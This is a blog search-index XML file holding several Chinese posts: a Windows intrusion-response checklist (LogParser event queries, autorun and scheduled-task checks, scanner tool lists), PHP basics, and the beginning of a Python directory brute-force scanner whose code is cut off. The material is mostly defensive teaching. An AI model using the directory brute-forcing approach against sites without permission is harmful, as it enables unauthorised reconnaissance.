<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Linux入侵排查</title>
    <link href="/2023/09/05/Linux%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/"/>
    <url>/2023/09/05/Linux%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="应急响应-Linux入侵排查"><a href="#应急响应-Linux入侵排查" class="headerlink" title="应急响应-Linux入侵排查"></a>应急响应-Linux入侵排查</h1><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2>]]></content>
    
    
    <categories>
      
      <category>应急响应</category>
      
    </categories>
    
    
    <tags>
      
      <tag>应急响应</tag>
      
      <tag>Linux应急</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Windows入侵排查</title>
    <link href="/2023/09/03/Windows%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/"/>
    <url>/2023/09/03/Windows%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="应急响应-windows入侵排查"><a href="#应急响应-windows入侵排查" class="headerlink" title="应急响应-windows入侵排查"></a>应急响应-windows入侵排查</h1><span id="more"></span><p>常见的应急响应事件分类</p><p>web入侵：网页挂马、主页篡改、webshell</p><p>系统入侵：病毒木马、勒索软件、远控后门</p><p>网络攻击：DDOS共计、DNS劫持、ARP欺骗</p><h2 id="0x01-检查系统账号安全"><a href="#0x01-检查系统账号安全" class="headerlink" title="0x01 检查系统账号安全"></a>0x01 检查系统账号安全</h2><ol><li><p>查看服务器是否有弱口令，远程的管理端口是否对公网开放</p></li><li><p>查看服务器是否存在可疑账号、新增账号</p><ul><li>打开cmd窗口，输入lusrmgr.msc命令，查看是否有新增&#x2F;可疑账号</li></ul></li><li><p>查看服务器是否存在隐藏账号、克隆账号</p><ul><li>打开注册表，查看管理员对应键值：cmd-regedit</li></ul><p>\HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names</p><p><img src="/2023/09/03/Windows%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/2.png" alt="image-20230903174751139"></p><ul><li><p>使用D盾_web查杀工具，它集成了对克隆账号检测的功能</p><p><img src="/2023/09/03/Windows%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/1.png" alt="image-20230903173031766"></p></li></ul></li><li><p>结合日志，查看管理员登陆时间、用户名是否存在异常</p><ul><li>cmd-eventvwr.msc，打开事件管理器</li><li>导出windows日志-安全，利用log parser进行分析</li></ul></li></ol><h2 id="0x02-日志审计-Log-Praser"><a href="#0x02-日志审计-Log-Praser" class="headerlink" title="0x02 日志审计-Log Praser"></a>0x02 日志审计-Log Praser</h2><h3 id="2-1-查询登陆成功的事件"><a href="#2-1-查询登陆成功的事件" class="headerlink" title="2.1 查询登陆成功的事件"></a>2.1 查询登陆成功的事件</h3><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs fortran"><br><span class="hljs-number">1</span>、登陆成功的所有事件：<br>LogParser.exe -i:EVT –o:DATAGRID  <span class="hljs-string">&quot;SELECT * FROM D:\Security.evtx where EventID=4624&quot;</span><br><span class="hljs-number">2</span>、指定登录时间范围的事件：<br>LogParser.exe -i:EVT –o:DATAGRID  <span class="hljs-string">&quot;SELECT * FROM D:\Security.evtx where TimeGenerated&gt;&#x27;2018-06-19 23:32:11&#x27; and TimeGenerated&lt;&#x27;2018-06-20 23:34:00&#x27; and EventID=4624&quot;</span><br><span class="hljs-number">3</span>、提取登陆成功的用户名和IP：<br>LogParser.exe -i:EVT –o:DATAGRID <span class="hljs-string">&quot;SELECT EXTRACT_TOKEN(Message,13,&#x27; &#x27;) as EventType,TimeGenerated as LoginTime,EXTRACT_TOKEN(Strings,5,&#x27;|&#x27;) as Username,EXTRACT_TOKEN(Message,38,&#x27; &#x27;) as Loginip FROM D:\Security.evtx where EventID=4624&quot;</span><br></code></pre></td></tr></table></figure><h3 id="2-2-查询登陆失败的事件"><a href="#2-2-查询登陆失败的事件" class="headerlink" title="2.2 查询登陆失败的事件"></a>2.2 查询登陆失败的事件</h3><figure class="highlight f#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs F#"><span class="hljs-number">1</span>、登陆失败的所有事件：<br>LogParser.exe <span class="hljs-operator">-</span>i<span class="hljs-operator">:</span>EVT –o<span class="hljs-operator">:</span>DATAGRID &quot;SELECT <span class="hljs-operator">*</span> FROM D<span class="hljs-operator">:</span>\<span class="hljs-built_in">lock</span>.evtx where EventID<span class="hljs-operator">=</span><span class="hljs-number">4625</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">2、提取登录失败用户名进行聚合统计：</span><br><span class="hljs-string">LogParser.exe -i:EVT &quot;</span>SELECT EXTRACT_TOKEN(Strings,<span class="hljs-number">13</span>,<span class="hljs-string">&#x27;|&#x27;</span>)  <span class="hljs-keyword">as</span> EventType,EXTRACT_TOKEN(Strings,<span class="hljs-number">19</span>,<span class="hljs-string">&#x27;|&#x27;</span>) <span class="hljs-keyword">as</span> user,count(EXTRACT_TOKEN(Strings,<span class="hljs-number">19</span>,<span class="hljs-string">&#x27;|&#x27;</span>)) <span class="hljs-keyword">as</span> Times,EXTRACT_TOKEN(Strings,<span class="hljs-number">39</span>,<span class="hljs-string">&#x27;|&#x27;</span>) <span class="hljs-keyword">as</span> Loginip FROM D<span class="hljs-operator">:</span>\<span class="hljs-built_in">lock</span>.evtx where EventID<span class="hljs-operator">=</span><span class="hljs-number">4625</span> GROUP BY Strings<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p>系统历史开关及记录：<br>LogParser.exe -i:EVT –o:DATAGRID “SELECT TimeGenerated,EventID,Message FROM c:\System.evtx where EventID&#x3D;6005 or EventID&#x3D;6006”</p><p>%%2307代表账号被锁定。<br>EXTRACT_TOKEN(Strings,5,’|’)函数是提取Strings中以|为分隔符的第5个值。</p><p>事件ID 说明<br>1102清理审计日志<br>4624账号成功登陆<br>4625账号登陆失败<br>4768kerberos身份认证（TGT请求）<br>4769kerberos服务票证请求<br>4776NTLM身份验证<br>4672 授予特殊权限<br>4720创建用户<br>4726删除用户<br>4728将成员添加到启用安全的全局组中<br>4729将成员从安全的全局组中移除<br>4732将成员添加到启用安全的本地组中<br>4733将成员从安全的本地组中移除<br>4756将成员添加到启用安全的通用组中<br>4757将成员从安全的通用组中移除<br>4719系统审计策略修改</p><h2 id="0x03-检查异常端口"><a href="#0x03-检查异常端口" class="headerlink" title="0x03 检查异常端口"></a>0x03 检查异常端口</h2><ul><li>netstat -ano 查看目前的网络连接，定位可疑的ESTABLISHED</li><li>根据netstat 定位出的pid，再通过tasklist命令进行进程定位 tasklist | findstr “PID”</li></ul><h2 id="0x04-检查异常进程"><a href="#0x04-检查异常进程" class="headerlink" title="0x04 检查异常进程"></a>0x04 检查异常进程</h2><ul><li><p>开始–运行–输入msinfo32，依次点击“软件环境→正在运行任务”就可以查看到进程的详细信息，比如进程路径、进程ID、文件创建日期、启动时间等。</p></li><li><p>打开D盾_web查杀工具，进程查看，关注没有签名信息的进程。</p></li><li><p>通过微软官方提供的 Process Explorer 等工具进行排查 。</p></li><li><p>查看可疑的进程及其子进程。可以通过观察以下内容：</p><p><img src="/2023/09/03/Windows%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/3.png" alt="image-20230903205606142"></p></li></ul><h3 id="小技巧"><a href="#小技巧" class="headerlink" title="小技巧"></a>小技巧</h3><p>查看端口对应的PID： <code>netstat -ano | findstr &quot;port&quot;</code></p><p>查看进程对应的PID：<code>任务管理器--查看--选择列--PID 或者 tasklist | findstr &quot;PID&quot;</code></p><p>杀掉对应的进程：taskkill &#x2F;F &#x2F;PID 21760</p><p>查看进程对应的程序位置：任务管理器–选择对应进程–右键打开文件位置</p><p>查看Windows服务所对应的端口： %system%&#x2F;system32&#x2F;drivers&#x2F;etc&#x2F;services（一般%system%就是</p><p>C:\Windows）</p><h2 id="0x05-检查启动项"><a href="#0x05-检查启动项" class="headerlink" title="0x05 检查启动项"></a>0x05 检查启动项</h2><ol><li><p>查看服务器是否有异常的启动项</p><p>win7：</p><p>[开始]&gt;[所有程序]&gt;[启动]，默认情况下此目录在是一个空目录，确认是否有非业务 程序在该目录下。</p><p>win10：</p><p>win11：</p><p><code>C:\Users\16037\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code></p></li><li><p>cmd-msconfig  查看是否存在命名异常的启动项目，是则取消勾选，并到相对应的路径下删除文件</p></li><li><p>cmd-regedit，打开注 册表，查看开机启动项是否正常，特别注意如下三个注册表项： HKEY_CURRENT_USER\software\micorsoft\windows\currentversion\run HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce 检查右侧是否有启动异常的项 目，如有请删除，并建议安装杀毒软件进行病毒查杀，清除残留病毒或木马。</p></li><li><p>利用安全软件查看启动项、开机时间管理等。</p></li><li><p>组策略，运行<strong>gpedit.msc</strong></p><p>win7：</p><p><img src="/2023/09/03/Windows%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/image-20230904112244355.png" alt="image-20230904112244355"></p></li></ol><h2 id="0x06-检查计划任务"><a href="#0x06-检查计划任务" class="headerlink" title="0x06 检查计划任务"></a>0x06 检查计划任务</h2><ol><li>【开始】&gt;【设置】&gt;【控制面板】&gt;【任务计划】，查看计划任务属性，便可以发现木马文件的路径。</li><li>【开始】&gt;【运行】；输入 cmd，然后输入at，检查计算机与网络上的其它计算机之间的会话或计划任 务，如有，则确认是否为正常连接。</li></ol><h2 id="0x07-检查服务自启动"><a href="#0x07-检查服务自启动" class="headerlink" title="0x07 检查服务自启动"></a>0x07 检查服务自启动</h2><p>服务自启动 检查方法：单击【开始】&gt;【运行】，输入services.msc，注意服务状态和启动类型，检查是否有异常服务。</p><p><img src="/2023/09/03/Windows%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/image-20230904113841988.png" alt="image-20230904113841988"></p><h2 id="0x08-检查系统相关信息"><a href="#0x08-检查系统相关信息" class="headerlink" title="0x08 检查系统相关信息"></a>0x08 检查系统相关信息</h2><ol><li><p>systeminfo</p></li><li><p>查找可疑目录及文件</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livescript">a、查看用户目录，新建账号会在这个目录生成一个用户目录，查看是否有新建用户目录。 Window <span class="hljs-number">2003</span> C:<span class="hljs-string">\Documents</span> <span class="hljs-keyword">and</span> Settings Window <span class="hljs-number">2008</span>R2 C:<span class="hljs-string">\Users\</span> <br>b、单击【开始】&gt;【运行】，输入%UserProfile%<span class="hljs-string">\Recent，分析最近打开分析可疑文件。</span> <br>c、在服务器各个目录，可根据文件夹内文件列表时间进行排序，查找可疑文件。 <br>d、回收站、浏览器下载目录、浏览器历史记录 <br>e、修改时间在创建时间之前的为可疑文件 <br></code></pre></td></tr></table></figure></li><li><pre><code class="hljs">得到发现WEBSHELL、远控木马的创建时间，如何找出同一时间范围内创建的文件？ a、利用 Registry Workshop 注册表编辑器的搜索功能，可以找到最后写入时间区间的文件。b、利用计算机自带文件搜索功能，指定修改时间进行搜索。</code></pre></li></ol><h2 id="0x09-自动化查杀"><a href="#0x09-自动化查杀" class="headerlink" title="0x09 自动化查杀"></a>0x09 自动化查杀</h2><p>病毒查杀</p><p>检查方法：下载安全软件，更新最新病毒库，进行全盘扫描。</p><p>webshell查杀</p><p>检查方法：选择具体站点路径进行webshell查杀，建议使用两款webshell查杀工具同时查杀，可相互补充规</p><p>则库的不足。</p><p><strong>1.6</strong> <strong>日志分析</strong></p><p>系统日志</p><p>分析方法：</p><p>a、前提：开启审核策略，若日后系统出现故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵者的</p><p>信息等。</p><p>b、Win+R打开运行，输入“eventvwr.msc”，回车运行，打开“事件查看器”。</p><p>C、导出应用程序日志、安全日志、系统日志，利用Log Parser进行分析。</p><p>WEB访问日志</p><p>分析方法：</p><p>a、找到中间件的web日志，打包到本地方便进行分析。</p><p>b、推荐工具：Window下，推荐用 EmEditor 进行日志分析，支持大文本，搜索效率还不错。</p><p>Linux下，使用Shell命令组合查询分析</p><h2 id="0x10-工具篇"><a href="#0x10-工具篇" class="headerlink" title="0x10 工具篇"></a>0x10 工具篇</h2><h3 id="10-1-病毒分析"><a href="#10-1-病毒分析" class="headerlink" title="10.1 病毒分析"></a>10.1 病毒分析</h3><p>PCHunter：<a href="http://www.xuetr.com/">http://www.xuetr.com</a></p><p>火绒剑：<a href="https://www.huorong.cn/">https://www.huorong.cn</a></p><p>Process Explorer：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer">https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer</a></p><p>processhacker：<a href="https://processhacker.sourceforge.io/downloads.php">https://processhacker.sourceforge.io/downloads.php</a></p><p>autoruns：<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns">https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns</a></p><p>OTL：<a href="https://www.bleepingcomputer.com/download/otl/">https://www.bleepingcomputer.com/download/otl/</a></p><p>SysInspector：<a href="http://download.eset.com.cn/download/detail/?product=sysinspector">http://download.eset.com.cn/download/detail/?product=sysinspector</a></p><h3 id="10-2-病毒查杀"><a href="#10-2-病毒查杀" class="headerlink" title="10.2 病毒查杀"></a>10.2 病毒查杀</h3><p>卡巴斯基：<a href="http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe">http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe</a> （推荐理由：绿色版、最新病毒库）</p><p>大蜘蛛：<a href="http://free.drweb.ru/download+cureit+free%EF%BC%88%E6%8E%A8%E8%8D%90%E7%90%86%E7%94%B1%EF%BC%9A%E6%89%AB%E6%8F%8F%E5%BF%AB%E3%80%81%E4%B8%80%E6%AC%A1%E4%B8%8B%E8%BD%BD%E5%8F%AA%E8%83%BD%E7%94%A81%E5%91%A8%EF%BC%8C%E6%9B%B4%E6%96%B0%E7%97%85%E6%AF%92%E5%BA%93%EF%BC%89">http://free.drweb.ru/download+cureit+free（推荐理由：扫描快、一次下载只能用1周，更新病毒库）</a></p><p>火绒安全软件：<a href="https://www.huorong.cn/">https://www.huorong.cn</a></p><p>360杀毒：<a href="http://sd.360.cn/download_center.html">http://sd.360.cn/download_center.html</a></p><h3 id="10-3-病毒动态"><a href="#10-3-病毒动态" class="headerlink" title="10.3 病毒动态"></a>10.3 病毒动态</h3><p>CVERC-国家计算机病毒应急处理中心：<a href="http://www.cverc.org.cn/">http://www.cverc.org.cn</a></p><p>微步在线威胁情报社区：<a href="https://x.threatbook.cn/">https://x.threatbook.cn</a></p><p>火绒安全论坛：<a href="http://bbs.huorong.cn/forum-59-1.html">http://bbs.huorong.cn/forum-59-1.html</a></p><p>爱毒霸社区：<a href="http://bbs.duba.net/">http://bbs.duba.net</a></p><p>腾讯电脑管家：<a href="http://bbs.guanjia.qq.com/forum-2-1.html">http://bbs.guanjia.qq.com/forum-2-1.html</a></p><h3 id="10-4-在线病毒扫描网站"><a href="#10-4-在线病毒扫描网站" class="headerlink" title="10.4 在线病毒扫描网站"></a>10.4 在线病毒扫描网站</h3><p><a href="http://www.virscan.org/">http://www.virscan.org</a> &#x2F;&#x2F;多引擎在线病毒扫描网 v1.02，当前支持 41 款杀毒引擎</p><p><a href="https://habo.qq.com/">https://habo.qq.com</a> &#x2F;&#x2F;腾讯哈勃分析系统</p><p><a href="https://virusscan.jotti.org/">https://virusscan.jotti.org</a> &#x2F;&#x2F;Jotti恶意软件扫描系统</p><p><a href="http://www.scanvir.com/">http://www.scanvir.com</a> &#x2F;&#x2F;针对计算机病毒、手机病毒、可疑文件等进行检测分析</p><h3 id="10-5-webshell查杀"><a href="#10-5-webshell查杀" class="headerlink" title="10.5 webshell查杀"></a>10.5 webshell查杀</h3><p>D盾_Web查杀：<a href="http://www.d99net.net/index.asp">http://www.d99net.net/index.asp</a></p><p>河马webshell查杀：<a href="http://www.shellpub.com/">http://www.shellpub.com</a></p><p>深信服Webshell网站后门检测工具：<a href="http://edr.sangfor.com.cn/backdoor_detection.html">http://edr.sangfor.com.cn/backdoor_detection.html</a></p><p>Safe3：<a href="http://www.uusec.com/webshell.zip">http://www.uusec.com/webshell.zip</a></p>]]></content>
    
    
    <categories>
      
      <category>应急响应</category>
      
    </categories>
    
    
    <tags>
      
      <tag>应急响应</tag>
      
      <tag>Windows应急</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP基础学习二</title>
    <link href="/2023/08/15/PHP%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%BA%8C/"/>
    <url>/2023/08/15/PHP%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%BA%8C/</url>
    
    <content type="html"><![CDATA[<h1 id="PHP基础学习二"><a href="#PHP基础学习二" class="headerlink" title="PHP基础学习二"></a>PHP基础学习二</h1><span id="more"></span>]]></content>
    
    
    <categories>
      
      <category>PHP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP基础学习一</title>
    <link href="/2023/08/05/PHP%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B8%80/"/>
    <url>/2023/08/05/PHP%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B8%80/</url>
    
    <content type="html"><![CDATA[<h1 id="PHP基础学习一"><a href="#PHP基础学习一" class="headerlink" title="PHP基础学习一"></a>PHP基础学习一</h1><span id="more"></span><h2 id="一、php基础语法"><a href="#一、php基础语法" class="headerlink" title="一、php基础语法"></a>一、php基础语法</h2><p>php代码可放置于文档中的任何位置</p><p>PHP 代码以 <em><?php* 开头，以 *?></em> 结尾，同时php代码可以嵌入到html代码当中。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;<br>&lt;html lang=<span class="hljs-string">&quot;zh-CN&quot;</span>&gt;<br>&lt;head&gt;<br>    &lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span> /&gt;<br>    &lt;title&gt;PHP&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hello world!&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p><img src="/2023/08/05/PHP%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B8%80/image-20230805104259969.png" alt="image-20230805104259969"></p><h2 id="二、注释"><a href="#二、注释" class="headerlink" title="二、注释"></a>二、注释</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">/*内容*/</span>   多行注释<br><span class="hljs-comment">//单行注释</span><br></code></pre></td></tr></table></figure><h2 id="三、变量"><a href="#三、变量" class="headerlink" title="三、变量"></a>三、变量</h2><h3 id="3-1-变量的声明"><a href="#3-1-变量的声明" class="headerlink" title="3.1 变量的声明"></a>3.1 变量的声明</h3><p>php的特性之一就是它并不要求在使用变量之前声明变量，当第一次给一个变量赋值时，才创建了这个变量，用于存储数字、文本字符串、数组等。一旦设置了某个变量，我们就可以在脚本中重复的使用。</p><p>php中变量必须使用【**$**+变量名】来表示</p><h3 id="3-2-变量的销毁"><a href="#3-2-变量的销毁" class="headerlink" title="3.2 变量的销毁"></a>3.2 变量的销毁</h3><p><span style="color:red;background:背景颜色;font-size:文字大小;font-family:字体;">unset()</span></p><h3 id="3-3-变量的命名"><a href="#3-3-变量的命名" class="headerlink" title="3.3 变量的命名"></a>3.3 变量的命名</h3><ul><li>严格区分大小写</li><li>变量名由字母或者下划线开头，不可使用数字开头</li><li>不要使用一些关键字作为变量名称</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;小二&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$name</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="3-4-变量的赋值"><a href="#3-4-变量的赋值" class="headerlink" title="3.4 变量的赋值"></a>3.4 变量的赋值</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-number">1000</span>;<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$a</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<span class="hljs-comment">//1000    </span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<span class="hljs-comment">//1000</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>相当于把<code>$a</code>的值复制一份再赋值给<code>$b</code></p><h3 id="3-5-变量的类型"><a href="#3-5-变量的类型" class="headerlink" title="3.5 变量的类型"></a>3.5 变量的类型</h3><p>变量类型是指保存在该变量中的数据类型。在php中不需要声明变量类型</p><p>使用<code>var_dump()</code>可以输出变量的类型</p><ul><li><p>bool：true&#x2F;fasle</p></li><li><p>int：整数</p></li><li><p>float：浮点</p></li><li><p>string：字符串</p><ul><li><p>用双引号，单引号，定界符</p></li><li><p>在字符串中，变量不会被解析，如果需要被解析，使用<code>&#123;变量&#125;</code></p></li><li><pre><code class="php">&lt;?php$b = &quot;大白&quot;;$a = &quot;dksadjsak&#123;$b&#125;&quot;;echo $a;?&gt;//dksadjsak大白    <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>- &lt;&lt;&lt;：定界符，<span class="hljs-number">1</span>处的字符串要和<span class="hljs-number">2</span>处的一致；定界符中可以包含单引号，双引号以及变量。<br><br>  ```php<br>  <span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-variable">$b</span> = <span class="hljs-number">123</span>;<br>  <span class="hljs-variable">$a</span> = &lt;&lt;&lt;www<span class="hljs-comment">//1</span><br>  hello world <span class="hljs-variable">$b</span><br>  www;<span class="hljs-comment">//2</span><br>  <span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br>  <span class="hljs-meta">?&gt;</span><br>  <span class="hljs-comment">//hello world 123</span><br></code></pre></td></tr></table></figure></code></pre></li></ul></li></ul><h2 id="四、常量"><a href="#四、常量" class="headerlink" title="四、常量"></a>四、常量</h2><p>相当于存储数据的容器：<span style="color:red;background:背景颜色;font-size:文字大小;font-family:字体;">define(‘常量名称’,常量值)</span>，按照惯例常量全部为大写：</p><ul><li>defined()函数用来检查是否定义了某个常量</li><li>常量只能用define()来定义</li><li>常量前面没有$符</li><li>预定义常量(php内核已经定义好的常量，且不区分大小写)<ul><li><img src="/2023/08/05/PHP%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B8%80/image-20230805144957203.png" alt="image-20230805144957203"></li></ul></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;MY_NAME&#x27;</span>,<span class="hljs-string">&#x27;张三&#x27;</span>);<br><span class="hljs-keyword">echo</span> MY_NAME;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="五、运算符"><a href="#五、运算符" class="headerlink" title="五、运算符"></a>五、运算符</h2><h3 id="5-1-算术运算符"><a href="#5-1-算术运算符" class="headerlink" title="5.1 算术运算符"></a>5.1 算术运算符</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">+</span> - * /<br></code></pre></td></tr></table></figure><p><img src="/2023/08/05/PHP%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B8%80/image-20230815151421698.png" alt="image-20230815151421698"></p><h3 id="5-2-字符串运算符"><a href="#5-2-字符串运算符" class="headerlink" title="5.2 字符串运算符"></a>5.2 字符串运算符</h3><p>小数点：<span style="color:red;background:背景颜色;font-size:文字大小;font-family:字体;">.</span> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">. 用来连接字符串<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;Azzml&quot;</span>;<br><span class="hljs-variable">$b</span> = <span class="hljs-string">&quot;blog&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>.<span class="hljs-variable">$b</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2023/08/05/PHP%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B8%80/image-20230815152808156.png" alt="image-20230815152808156"></p><h3 id="5-3-比较运算符"><a href="#5-3-比较运算符" class="headerlink" title="5.3 比较运算符"></a>5.3 比较运算符</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">==：值是否相等，若相等为<span class="hljs-literal">true</span>，若不等则为<span class="hljs-literal">false</span><br>===：全等(值要相等，类型也要相等)，若相等为<span class="hljs-literal">true</span>，若不等则为<span class="hljs-literal">false</span><br>!=：值是否不相等，若不相等为<span class="hljs-literal">true</span>，若相等则为<span class="hljs-literal">false</span><br>&lt;&gt;：值是否不相等，若不相等为<span class="hljs-literal">true</span>，若相等则为<span class="hljs-literal">false</span>    <br>!==：值和类型不全等则为<span class="hljs-literal">true</span>，若两边全等为<span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><h3 id="5-4-逻辑运算符"><a href="#5-4-逻辑运算符" class="headerlink" title="5.4 逻辑运算符"></a>5.4 逻辑运算符</h3><ul><li>与：and 或者&amp;&amp;，左右两边表达式的值均为true，最终的结果才为true，其他情况均为false</li><li>或：or 或者||，左右两边表达式的值只要有一个是true，结果就为true，两边值均为false时，结果才为false</li><li>异或：xor，左右两边表达式的值不一样时，结果为true，若一样，则结果为false</li><li>非：！，将原来表达式的值取反，true转为false，false转为true</li></ul><h3 id="5-5-位运算符"><a href="#5-5-位运算符" class="headerlink" title="5.5 位运算符"></a>5.5 位运算符</h3>]]></content>
    
    
    <categories>
      
      <category>PHP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python目录扫描脚本</title>
    <link href="/2023/08/04/Python%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%E8%84%9A%E6%9C%AC/"/>
    <url>/2023/08/04/Python%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%E8%84%9A%E6%9C%AC/</url>
    
    <content type="html"><![CDATA[<p>Python目录扫描</p><ul><li>输入目标Url和线程大小</li><li>以队列的形式从字典中获取要爆破的路径</li><li>定义路径获取函数get_path()</li><li>利用多线程进行url目录爆破</li><li>定义目录爆破函数get_url()</li></ul><span id="more"></span><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 